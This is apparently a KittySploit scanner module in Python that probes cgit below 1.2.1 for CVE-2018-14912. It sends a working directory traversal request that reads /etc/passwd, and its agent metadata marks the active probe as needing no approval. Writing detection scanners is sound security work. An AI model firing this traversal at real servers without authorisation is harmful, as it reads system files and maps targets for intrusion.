#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""cGit < 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'cgit < 1.2.1 - Directory Traversal Detection',
        'description': 'cGit < 1.2.1 via cgit_clone_objects has a directory traversal vulnerability when `enable-http-clone=1` is not turned off, as demonstrated by a cgit/cgit.cgi/git/objects/?path=../ request.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'cgit', 'lfi', 'cgit_project', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cxsecurity.com/issue/WLB-2018080034',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-14912',
            'https://lists.zx2c4.com/pipermail/cgit/2018-August/004176.html',
            'https://bugs.chromium.org/p/project-zero/issues/detail?id=1627',
            'https://lists.debian.org/debian-lts-announce/2018/08/msg00005.html',
        ],
        'cve': 'CVE-2018-14912',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:[x*]:0:0',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="cgit < 1.2.1 - Directory Traversal detected",
                path='/cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd',
            )
            return True
        return False

